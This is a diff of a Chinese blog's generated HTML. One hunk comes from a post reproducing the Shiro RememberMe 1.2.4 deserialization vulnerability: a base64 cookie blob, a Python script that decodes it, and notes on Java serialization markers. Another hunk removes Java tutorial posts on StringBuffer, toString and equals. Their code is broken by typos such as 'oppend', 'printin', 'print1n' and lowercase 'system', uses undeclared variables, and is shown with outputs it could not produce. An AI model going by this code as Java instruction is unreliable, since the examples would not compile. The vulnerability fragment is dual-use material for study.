 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q&#x2F;XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7&#x2F;+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX&#x2F;nttUd3n&#x2F;b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA&#x2F;smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn&#x2F;iI&#x2F;ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG</span><br></pre></td></tr></table></figure>
 
 <p>进行在线base64解码，发现为乱码</p>
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/base64%E8%A7%A3%E7%A0%811.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/base64%E8%A7%A3%E7%A0%811.png"></p>
 <p>将解码内容存储为二进制文件 1.py</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">str1 = <span class="string">&quot;dQf1WDa09v4TDHbM1PZPi6sBhQ3zl1OwDb1S+65wgSBl8TYuJ9KJ9cXgR0CPCk1LiUEZPoSzvruwEklb8GSdIydV8NjnJiKxysiEWzG1j+WTu536Rdl8b6Q/XNrNStpUSq3e9XELd0nFYYTeN0T9PJY0aXoJZiXdX7/+0XcMhYhktyY+TmDAjDce2Th15sQmltPHJt6q0xX/nttUd3n/b5mnezxBenwiqWyuG8zNFIZOU7iVsga8UwqthnZsUwF7JkJBWMO3duSxcpTO9G5NmdWf1CnkCFmItyjyomZRLiiSU8CSsrrSGgg7k4BoIC6kH9NuMwwKbBKzofmViN9NxnKw+zWo6FJd8t8sRitAsIv+6FS1dqCA/smFivXJ3hu052f5greHTT4nmwPBGB3dGpR6497roCVCFpaGV89rN72dFPpHakitEXFJc92VJnAdnKpvlsTNnzhRRWJDb5nA0p1jn/iI/ckSiXxKiKDN9TyrOpVviekVCKau+BNxa6dG&quot;</span></span><br><span class="line">tem = base64.b64decode(str1)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:                                           </span><br><span class="line">      f.write(tem)</span><br><span class="line"> f.close()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/15/Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E7%A0%81%E5%90%8E%E4%BA%8C%E8%BF%9B%E5%88%B6.png"></p>
+<p><img src="/2021/04/15/%E4%B8%80Shiro-RememberMe-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%BC%E8%87%B4%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E8%A7%A3%E7%A0%81%E5%90%8E%E4%BA%8C%E8%BF%9B%E5%88%B6.png"></p>
 <p>没有看到有明确的 Java 序列化特征字</p>
 <p><strong>Java 序列化特征字</strong></p>
 <p>​    <strong><code>实现Serializable接口</code></strong></p>
@@ -1874,106 +2046,6 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringBuffer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        StringBuffer sb= <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        sb.append(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        sb.oppend(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;sb= &quot;</span>+ sb); <span class="comment">//sb= abc123</span></span><br><span class="line">        sb.insert(<span class="number">3</span>,<span class="string">&quot;--&quot;</span>);</span><br><span class="line">        System.out.printin(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = abc--123</span></span><br><span class="line">        sb.delete(<span class="number">2</span>,<span class="number">6</span>); <span class="comment">//把下标从2开始到6-1结束的字符到除</span></span><br><span class="line">        System.out.println(<span class="string">&quot;sb = &quot;</span> + sb); <span class="comment">//sb = ab23</span></span><br><span class="line">        sb.reverse();</span><br><span class="line">        system.out.println(<span class="string">&quot;sb= &quot;</span> + sb); <span class="comment">//sb = 32ba</span></span><br><span class="line">        String str = sb.toString();</span><br><span class="line">        System.out.printf(<span class="string">&quot;str = &quot;</span> + str); <span class="comment">//str = 32ba</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>StringBuffer常用方法查阅手册</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
-
-    <!-- copyright -->
-    
-    <footer class="article-footer">
-       
-    </footer>
-  </div>
-
-    
- 
-    
-</article>
-
-    
-    <article
-  id="post-Java-4toString"
-  class="article article-type-post"
-  itemscope
-  itemprop="blogPost"
-  data-scroll-reveal
->
-  <div class="article-inner">
-    
-    <header class="article-header">
-       
-<h2 itemprop="name">
-  <a class="article-title" href="/2021/04/15/Java-4toString/"
-    >Java 4toString</a> 
-</h2>
- 
-
-    </header>
-     
-    <div class="article-meta">
-      <a href="/2021/04/15/Java-4toString/" class="article-date">
-  <time datetime="2021-04-15T02:19:46.000Z" itemprop="datePublished">2021-04-15</time>
-</a> 
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Java/">Java</a>
-  </div>
-   
-    </div>
-      
-    <div class="article-entry" itemprop="articleBody">
-       
-  <h1 id="ToString-方法介绍"><a href="#ToString-方法介绍" class="headerlink" title="ToString()方法介绍"></a>ToString()方法介绍</h1><p>类会自动继承Object，里面的ToString方法会输出 <strong>（类名）@（对象的哈希码）</strong></p>
-<p><img src="/2021/04/15/Java-4toString/%E7%A4%BA%E4%BE%8B1.png"></p>
-<p><strong>@后是对象内存地址的十六进制表示</strong></p>
-<p><strong>ToString里面存有对象信息</strong></p>
-<p>例子：System.out.println(类对象名)；示例1</p>
-<p>未重写ToString方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestToString</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		A aa = <span class="keyword">new</span> A();</span><br><span class="line">		System.out.println(aa);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">__________________________________________________</span><br><span class="line">输出结果</span><br><span class="line">    A<span class="meta">@de6ced</span></span><br></pre></td></tr></table></figure>
-
-<p>重写ToSrting方法</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">return</span><span class="string">&quot;哈哈&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestToString</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">        System.out.println(aa);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">________________________________________________</span><br><span class="line">    输出结果</span><br><span class="line">    	哈哈</span><br></pre></td></tr></table></figure>
-
-<h1 id="toString方法总结"><a href="#toString方法总结" class="headerlink" title="toString方法总结"></a>toString方法总结</h1><ul>
-<li>所有的类都默认自动继承了Object类</li>
-<li>Object类中的toString方法返回的是<strong>类的名字和该对象哈希吗组成</strong>的一个字符串-</li>
-<li>system.out.printIn(类对对象);<pre><code>   实际输出的是该对象的toString()方法所返回的字符串
-</code></pre>
-</li>
-<li>为了实际需要，建议子类重写从父类Object继承的toString方法</li>
-</ul>
-<h1 id="equals"><a href="#equals" class="headerlink" title="equals"></a>equals</h1><p>String类，处理字符串</p>
-<p>String类中的Equals方法是比较字符串方法</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A aa1 &#x3D; new A(2);</span><br><span class="line">A aa2 &#x3D; new A(2);</span><br></pre></td></tr></table></figure>
-
-<p>aa1 和 aa2 里面存储的是内存地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println( aa1.equals(aa2) ); &#x2F;&#x2F;相互比较</span><br></pre></td></tr></table></figure>
-
-<p>Obj的equals认为值虽然一样但内存地址不一样输出falst</p>
-<p>容器 List 和 set 不允许存储相同元素就需要重写equals</p>
-<p>例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//if(当前对象的i和obj代表的i相等)</span></span><br><span class="line">        <span class="comment">//if(this.i == obj.i) //Obj.i 这么写是错误的，父类的引用不能调用子类特有的成员</span></span><br><span class="line">  		</span><br><span class="line">        <span class="comment">//正确</span></span><br><span class="line">        A aa = (A)Obj;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">this</span>.i ==aa.i)</span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        	<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestStringEquals_2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        aa1 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line">    	aa2 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line">    	System.out.print1n( aa1.equals(aa2) );<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Object类的equals方法"><a href="#Object类的equals方法" class="headerlink" title="Object类的equals方法"></a>Object类的equals方法</h1><ul>
-<li>所有类都从Object类中继承了equlas方法o</li>
-<li>bject类中equals方法源代码如下:</li>
-</ul>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object obj)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">this</span> == obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>Object中的equals方法是直接判断this和obj本身的值是否相等，即用来判断调用equals的对象和形参obj所引用的对象是否是同一对象，所谓同一对象就是指是内存中同一块存储单元，如果this和obj指向的是同一块内存对象，则返回true，如果this和obj指向的不是同一块内存，则返回false,注意：<strong>即便是内容完全相等的两块不同的内存对象，也会返回false</strong></li>
-<li><strong>如果是同一块内存，则Object中的equals方法返回true。如果是不同的内存，则返回false</strong></li>
-</ul>
-<h1 id="何时需要重写euqals方法"><a href="#何时需要重写euqals方法" class="headerlink" title="何时需要重写euqals方法"></a>何时需要重写euqals方法</h1><ul>
-<li>用一个类构造出来的不同内存的两个对象，如果内存中的值相等，我们一般情况下也应该认为这两个对象相等，很明显Object中的equals()无法完成这样的重任，Object中的<br>equals()方法只有在两个对象是同一块内存时，才返回true,这时候我们就有必要重写父类Object中的equals方法</li>
-<li>如果希望<strong>不同内存但相同内容的两个对象equals时返回true</strong>，则我们需要重写父类的equals方法</li>
-</ul>
-<p>例子</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> i;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">A</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.i = i;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        A aa1 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">        A aa2 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">        System.out.println(aa1 == aa2);</span><br><span class="line">        system.out.println(aa1.equals(aa2));   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">___________________________</span><br><span class="line">    输出结果</span><br><span class="line">    	<span class="keyword">false</span></span><br><span class="line">    	<span class="keyword">false</span></span><br></pre></td></tr></table></figure>
-
  
       <!-- reward -->
       
